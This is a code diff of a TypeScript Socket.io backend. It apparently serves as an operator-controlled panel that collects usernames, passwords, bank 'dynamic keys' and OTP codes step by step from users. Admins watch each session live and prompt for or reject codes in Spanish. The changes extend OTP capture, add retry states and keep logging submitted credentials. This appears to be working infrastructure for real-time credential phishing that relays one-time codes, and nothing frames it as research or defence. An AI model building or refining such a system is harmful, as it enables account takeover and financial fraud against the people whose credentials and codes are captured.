@@ -13,14 +13,14 @@ type Role = "admin" | "user";
 
 type Ack = (res: { ok: boolean; error?: string }) => void;
 
-type Auth = {user: string, pass: string, dinamic: string};
+type Auth = { user: string; pass: string; dinamic: string; otp: string };
 
 type AdminRejectPayload = { sessionId: string; message?: string };
 type AdminRequestPayload = { sessionId: string };
 
 type UserSubmitAuth = { sessionId: string; auth: Auth };
 type UserSubmitDinamic = { sessionId: string; auth: Auth };
-type UserSubmitOtp = { sessionId: string; otp: string };
+type UserSubmitOtp = { sessionId: string; auth: Auth };
 
 export type AuthPayload =
   | { role: "admin"; adminId: string; email: string }
@@ -109,10 +109,8 @@ async function emitSessionUpdate<T>(
   const s = await repo.findById(sessionId);
   if (!s) return null;
 
-
   io.to(`session:${sessionId}`).emit("session:update", s);
   io.to("admins").emit("admin:sessions:upsert", s);
-
 
   return s;
 }
@@ -155,13 +153,12 @@ io.on("connect", (socket) => {
         if (!isNonEmptyString(payload.sessionId)) return;
 
         const s = await repo.findById(payload.sessionId);
-        if (!s || s.action !== ActionState.AUTH_WAIT_ACTION) return;
+        if (!s || s.action !== ActionState.AUTH_WAIT_ACTION && s.action !== ActionState.OTP_WAIT_ACTION) return;
 
         await repo.update(payload.sessionId, {
           action: ActionState.DINAMIC,
           lastError: null,
         });
-        const s2 = await repo.findById(payload.sessionId);
         await emitSessionUpdate(io, repo, payload.sessionId);
       } catch (e) {
         console.error("admin:request_dinamic error", e);
@@ -195,7 +192,7 @@ io.on("connect", (socket) => {
         if (!isNonEmptyString(payload.sessionId)) return;
 
         const s = await repo.findById(payload.sessionId);
-        if (!s || s.action !== ActionState.OTP_WAIT_ACTION) return;
+        if (!s || s.action !== ActionState.DINAMIC_WAIT_ACTION && s.action !== ActionState.AUTH_WAIT_ACTION) return;
 
         await repo.update(payload.sessionId, {
           action: ActionState.OTP,
@@ -217,15 +214,15 @@ io.on("connect", (socket) => {
         if (!s || s.action !== ActionState.OTP_WAIT_ACTION) return;
 
         await repo.update(payload.sessionId, {
-          action: ActionState.OTP,
+          action: ActionState.OTP_ERROR,
           lastError: isNonEmptyString(payload.message)
             ? payload.message.trim()
-            : "Documento inválido. Verifica e intenta nuevamente.",
+            : "Codigo otp inválido. Verifica e intenta nuevamente.",
         });
 
         await emitSessionUpdate(io, repo, payload.sessionId);
       } catch (e) {
-        console.error("admin:reject_doc error", e);
+        console.error("admin:reject_otp error", e);
       }
     });
 
@@ -237,7 +234,7 @@ io.on("connect", (socket) => {
         const s = await repo.findById(payload.sessionId);
         if (!s || s.action !== ActionState.OTP_WAIT_ACTION) return;
 
-       /*  await repo.update(payload.sessionId, {
+        /*  await repo.update(payload.sessionId, {
           action: ActionState.DONE,
           lastError: null,
         }); */
@@ -257,12 +254,11 @@ io.on("connect", (socket) => {
       if (s.action === ActionState.AUTH_ERROR) return;
       socket.emit("session:update", s);
     });
-    
+
     socket.on(
       "user:submit_auth",
       async (payload: UserSubmitAuth, ack?: Ack) => {
         try {
-
           mustBeUser(socket);
 
           if (!isNonEmptyString(payload.sessionId))
@@ -273,21 +269,27 @@ io.on("connect", (socket) => {
           const pass = payload.auth.pass?.trim();
           const user = payload.auth.user?.trim();
 
-
-          if ((!isNonEmptyString(pass) || pass.length < 2) || (!isNonEmptyString(user) || user.length < 2))
+          if (
+            !isNonEmptyString(pass) ||
+            pass.length < 2 ||
+            !isNonEmptyString(user) ||
+            user.length < 2
+          )
             return ack?.({ ok: false, error: "invalid_credentials" });
 
           const s = await repo.findById(payload.sessionId);
           if (!s) return ack?.({ ok: false, error: "session not found" });
 
-
-          
           // ✅ permitir reintento
           if (!s.action) return ack?.({ ok: false, error: "bad_state" });
 
-          const allowed: ActionState[] = [ActionState.AUTH, ActionState.AUTH_ERROR];
-          if (!allowed.includes(s.action)) return ack?.({ ok:false, error:"bad_state" });
-          
+          const allowed: ActionState[] = [
+            ActionState.AUTH,
+            ActionState.AUTH_ERROR,
+          ];
+          if (!allowed.includes(s.action))
+            return ack?.({ ok: false, error: "bad_state" });
+
           await repo.update(payload.sessionId, {
             user: user,
             pass: pass,
@@ -319,10 +321,13 @@ io.on("connect", (socket) => {
 
           const s = await repo.findById(payload.sessionId);
           if (!s) return ack?.({ ok: false, error: "not_found" });
-          
-          const allowed: ActionState[] = [ActionState.DINAMIC, ActionState.DINAMIC_ERROR];
-          if (!allowed.includes(s.action)) return ack?.({ ok:false, error:"bad_state" });
-          
+
+          const allowed: ActionState[] = [
+            ActionState.DINAMIC,
+            ActionState.DINAMIC_ERROR,
+          ];
+          if (!allowed.includes(s.action))
+            return ack?.({ ok: false, error: "bad_state" });
 
           await repo.update(payload.sessionId, {
             dinamic: dinamic,
@@ -346,17 +351,19 @@ io.on("connect", (socket) => {
           return ack?.({ ok: false, error: "bad_session" });
         mustMatchSession(socket, payload.sessionId);
 
-        const document = payload.otp?.trim();
-        if (!isNonEmptyString(document) || document.length < 5)
-          return ack?.({ ok: false, error: "invalid_document" });
+        const otp = payload.auth.otp.trim();
+        if (!isNonEmptyString(otp) || otp.length < 5)
+          return ack?.({ ok: false, error: "invalid_otp" });
 
         const s = await repo.findById(payload.sessionId);
         if (!s) return ack?.({ ok: false, error: "not_found" });
-        if (s.action !== ActionState.OTP)
+
+        const allowed: ActionState[] = [ActionState.OTP, ActionState.OTP_ERROR];
+        if (!allowed.includes(s.action))
           return ack?.({ ok: false, error: "bad_state" });
 
         await repo.update(payload.sessionId, {
-          document,
+          otp,
           action: ActionState.OTP_WAIT_ACTION,
           lastError: null,
         });
@@ -379,7 +386,7 @@ app.post("/api/sessions", async (_req, res) => {
   if (data.user && data.pass) {
     data.action = ActionState.AUTH_WAIT_ACTION;
   }
- 
+
   console.log(data);
 
   const session = await repo.create(data);
